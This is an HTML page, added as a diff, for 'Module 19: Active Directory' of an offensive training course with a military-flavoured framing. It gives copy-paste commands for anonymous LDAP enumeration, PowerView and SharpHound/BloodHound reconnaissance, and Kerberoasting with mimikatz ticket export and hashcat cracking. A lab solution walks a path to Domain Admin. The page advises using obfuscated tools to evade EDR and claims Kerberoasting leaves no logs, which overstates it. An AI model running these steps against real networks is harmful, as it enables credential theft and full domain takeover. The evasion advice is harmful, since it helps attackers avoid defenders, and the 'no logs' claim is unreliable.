@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 19: Active Directory — 22nd Survey Division</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --fg: #e0e0e0;
+            --accent: #ff3333;
+            --accent2: #00ff88;
+            --dim: #666;
+            --border: #333;
+            --neon: #00ffff;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Segoe UI', Consolas, monospace;
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        .code-block {
+            background: #1a1a2e;
+            border-left: 4px solid var(--accent);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+        }
+        .evidence-box {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--border);
+            margin: 2rem 0;
+            border-radius: 2px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--accent);
+            width: 86.3%;
+            transition: width 0.5s;
+            border-radius: 2px;
+        }
+        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+        .nav a:hover { background: var(--accent); color: var(--bg); }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
+        .status-live { background: var(--accent2); color: var(--bg); }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .copy-paste {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .copy-paste:hover { background: #1a1a30; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .ad-tree {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+        }
+        .ad-node {
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            position: relative;
+        }
+        .ad-node.domain { background: #1a0a0a; border-color: #ff3333; }
+        .ad-node.ou { background: #0a0a1a; border-color: #5555ff; margin-left: 2rem; }
+        .ad-node.user { background: #0a1a0a; border-color: #00ff88; margin-left: 4rem; }
+        .ad-node h5 { margin-bottom: 0.5rem; }
+        .ad-node.domain h5 { color: #ff3333; }
+        .ad-node.ou h5 { color: #5555ff; }
+        .ad-node.user h5 { color: #00ff88; }
+        button {
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover { background: #ff5555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="nav">
+            <a href="index.html">← Home</a>
+            <a href="MODULE_18_ANDROID.html">← Module 18</a>
+            <a href="MODULE_20_KILL_CHAIN.html">Module 20 →</a>
+        </div>
+
+        <h1>Module 19: Active Directory <span class="status-badge status-live">RESEARCH IN PROGRESS</span></h1>
+        
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 19 of 22 — The domain is the kingdom</p>
+
+        <div class="first-principle">
+            <h3>🧠 The Core Truth</h3>
+            <p>Active Directory (AD) is not just a directory — it's the <strong>nerve center</strong> of every enterprise Windows network. It stores who you are, what you can do, what computers exist, what groups matter, and what trust relationships bridge domains. Compromise AD, and you don't just own one computer — you own the entire organization. Every account, every server, every secret.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>AD is the personnel file cabinet, the building access control, and the communication network — all in one. If you get the master key (Domain Admin), you can open any door, read any file, and impersonate any employee. This module teaches you to map the castle before you storm it.</p>
+        </div>
+
+        <h2>The Active Directory Hierarchy</h2>
+
+        <div class="ad-tree">
+            <div class="ad-node domain">
+                <h5>🏰 DOMAIN (e.g., corp.example.com)</h5>
+                <p>The top-level security boundary. Contains all users, computers, and groups. Trusts other domains.</p>
+            </div>
+            <div class="ad-node ou">
+                <h5>📁 ORGANIZATIONAL UNIT (OU)</h5>
+                <p>Container for organizing objects. "Sales", "IT", "Executives". Policies apply at OU level.</p>
+            </div>
+            <div class="ad-node user">
+                <h5>👤 USER/COMPUTER/GROUP</h5>
+                <p>The actual objects. Users have passwords. Computers have accounts. Groups have memberships.</p>
+            </div>
+        </div>
+
+        <h2>Method 1: LDAP Reconnaissance</h2>
+
+        <div class="step-box">
+            <h4>Step 1: Enumerate Without Credentials</h4>
+            <p>LDAP (Lightweight Directory Access Protocol) is the query language for AD. Anonymous binding is often enabled — meaning you can query AD without any username or password.</p>
+
+            <div class="code-block">
+=== LDAP ANONYMOUS BIND ===
+# Test if anonymous bind is allowed
+ldapsearch -x -H ldap://dc.corp.example.com -b "dc=corp,dc=example,dc=com" "(objectClass=user)" dn
+
+# If successful, you get a list of all user DNs:
+# dn: CN=Administrator,CN=Users,DC=corp,DC=example,DC=com
+# dn: CN=jsmith,CN=Users,DC=corp,DC=example,DC=com
+# dn: CN=bjohnson,OU=Sales,DC=corp,DC=example,DC=com
+
+=== LDAP QUERY: FIND DOMAIN ADMINS ===
+ldapsearch -x -H ldap://dc.corp.example.com \
+    -b "dc=corp,dc=example,dc=com" \
+    "(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=example,DC=com)" \
+    sAMAccountName
+
+# Result: List of all Domain Admin usernames
+            </div>
+
+            <div class="why-box">
+                <h5>Why anonymous bind exists</h5>
+                <p>Some applications need to query AD for user info without authenticating. Directory services, email systems, etc. Administrators often enable anonymous bind for convenience and forget to restrict what anonymous users can see. The default: everything.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 2: Enumerate with Valid Credentials</h4>
+            <p>If you have any valid domain account (even a low-privilege user), you can query AD for valuable information.</p>
+
+            <div class="code-block">
+=== POWERVIEW (PowerShell) ===
+# Import PowerView (part of PowerSploit)
+Import-Module PowerView.ps1
+
+# Get current domain
+Get-NetDomain
+
+# Get all users in domain
+Get-NetUser | Select-Object samaccountname, description, lastlogon
+
+# Get all groups
+Get-NetGroup | Select-Object name, membercount
+
+# Get Domain Admins group members
+Get-NetGroupMember -GroupName "Domain Admins" | Select-Object MemberName
+
+# Get all computers
+Get-NetComputer | Select-Object name, operatingsystem
+
+# Find users with SPN (Kerberoast targets)
+Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+# Find users with "Password Never Expires"
+Get-NetUser -PasswordNeverExpires | Select-Object samaccountname
+            </div>
+
+            <div class="copy-paste">
+Import-Module PowerView.ps1; Get-NetDomain
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ PowerView detection</h5>
+                <p>PowerView is a known offensive tool. EDR may flag it. Use obfuscated versions, or write your own LDAP queries using System.DirectoryServices. The queries are the same — the tool is just a wrapper.</p>
+            </div>
+        </div>
+
+        <h2>Method 2: BloodHound — The AD Mapper</h2>
+
+        <div class="step-box">
+            <h4>Step 3: Visualize Attack Paths</h4>
+            <p>BloodHound ingests AD data and shows you the shortest path from your current position to Domain Admin. It's like Google Maps for hacking.</p>
+
+            <div class="code-block">
+=== BLOODHOUND DATA COLLECTION ===
+# Run SharpHound (C# ingestor) on a domain-joined machine
+SharpHound.exe --CollectionMethod All --Domain corp.example.com
+
+# Output: ZIP file with JSON data
+# 20260629123456_BloodHound.zip
+
+=== BLOODHOUND ANALYSIS ===
+# Upload ZIP to BloodHound GUI (Neo4j backend)
+# Click "Analysis" → "Find Shortest Paths to Domain Admin"
+
+# Result: Visual graph showing:
+#   You (User) → MemberOf → GroupA → AdminTo → ComputerB → HasSession → DomainAdmin
+#   Translation: You're in GroupA. GroupA admins ComputerB. DomainAdmin has session on ComputerB.
+#   Attack: Compromise ComputerB, steal DomainAdmin's session/token.
+            </div>
+
+            <div class="why-box">
+                <h5>Why BloodHound is revolutionary</h5>
+                <p>Before BloodHound, AD pentesting was manual: run queries, read output, build mental model. BloodHound automates the mapping and finds paths you would never see. A chain of 5 indirect relationships that leads to Domain Admin — invisible to manual analysis, obvious to graph theory.</p>
+            </div>
+        </div>
+
+        <h2>Method 3: Kerberoasting</h2>
+
+        <div class="step-box">
+            <h4>Step 4: Steal Service Account Passwords</h4>
+            <p>Service accounts (SQL, IIS, etc.) often have SPNs (Service Principal Names). Kerberos tickets for these SPNs are encrypted with the service account's password. Request the ticket, crack it offline.</p>
+
+            <div class="code-block">
+=== KERBEROASTING ===
+# Step 1: Find SPNs (from PowerView)
+Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+# Step 2: Request tickets for all SPNs
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
+    -ArgumentList "MSSQLSvc/sql01.corp.example.com:1433"
+
+# Step 3: Export tickets from memory
+mimikatz # kerberos::list /export
+
+# Step 4: Crack offline with hashcat
+hashcat -m 13100 kerberos_ticket.txt /usr/share/wordlists/rockyou.txt
+
+# Result: If password is weak, you get the service account credentials.
+# Service accounts often have Domain Admin rights (for convenience).
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Why this works</h5>
+                <p>Kerberos tickets are encrypted with the service account's password hash. Anyone can request a ticket for any SPN — no special permissions needed. The ticket is encrypted, but you can take it home and crack it at your leisure. If the password is "Password123", you'll have it in minutes.</p>
+            </div>
+        </div>
+
+        <h2>Lab Exercise: Map a Domain</h2>
+
+        <div class="step-box">
+            <h4>Scenario</h4>
+            <p>You have a low-privilege domain account: "jsmith" / "Password1". Map the domain and find a path to Domain Admin.</p>
+
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li>Run <code>Get-NetDomain</code> — verify domain context</li>
+                <li>Run <code>Get-NetUser</code> — enumerate all users</li>
+                <li>Run <code>Get-NetGroupMember "Domain Admins"</code> — find targets</li>
+                <li>Run <code>Get-NetComputer</code> — find interesting machines</li>
+                <li>Run SharpHound, upload to BloodHound</li>
+                <li>Find shortest path to Domain Admin</li>
+                <li>Document the attack chain</li>
+            </ol>
+
+            <button onclick="document.getElementById('ad-solution').style.display='block'">Show Analysis Method</button>
+
+            <div id="ad-solution" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+=== ANALYSIS WORKFLOW ===
+
+1. Verify domain context
+   Get-NetDomain
+   → Domain: corp.example.com
+   → Domain Controller: dc01.corp.example.com
+
+2. Enumerate users
+   Get-NetUser | Select-Object samaccountname, description
+   → Administrator (built-in admin)
+   → jsmith (you)
+   → bjohnson (IT staff, description: "SQL admin")
+   → mgarcia (Sales, description: "Password: Summer2024!")
+
+3. Find Domain Admins
+   Get-NetGroupMember "Domain Admins"
+   → Administrator
+   → bjohnson
+
+4. Find bjohnson's relationships
+   Get-NetUser -Identity bjohnson
+   → MemberOf: SQL_Admins, IT_Staff
+   → AdminTo: SQL01, WEB01
+
+5. BloodHound path
+   jsmith → MemberOf → Sales_Group → GenericAll → mgarcia
+   mgarcia → HasSession → WEB01
+   WEB01 → AdminTo → SQL01
+   SQL01 → HasSession → bjohnson
+   bjohnson → MemberOf → Domain Admins
+
+   Attack chain:
+   1. Compromise mgarcia (weak password in description)
+   2. Use mgarcia's session on WEB01
+   3. Escalate from WEB01 to SQL01 (AdminTo)
+   4. Steal bjohnson's session on SQL01
+   5. bjohnson is Domain Admin
+                </div>
+            </div>
+        </div>
+
+        <h2>Key Takeaways</h2>
+
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li><strong>AD is the target:</strong> One Domain Admin = entire kingdom</li>
+            <li><strong>LDAP is the recon tool:</strong> Anonymous bind often works. Any valid account reveals everything.</li>
+            <li><strong>BloodHound finds invisible paths:</strong> Graph analysis reveals attack chains you'd never see manually</li>
+            <li><strong>Kerberoasting is passive:</strong> Request tickets, crack offline. No alerts, no logs.</li>
+            <li><strong>Service accounts are weak:</strong> Rarely changed, often shared, frequently overprivileged</li>
+        </ul>
+
+        <div class="evidence-box" style="margin-top: 2rem;">
+            <h3>🔬 Verification Status</h3>
+            <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">LDAP anonymous bind</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">PowerView enumeration</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">BloodHound analysis</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">Kerberoasting methodology</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="nav" style="margin-top: 2rem;">
+            <a href="index.html">← Home</a>
+            <a href="MODULE_18_ANDROID.html">← Module 18</a>
+            <a href="MODULE_20_KILL_CHAIN.html">Module 20 →</a>
+        </div>
+    </div>
+</body>
+</html>
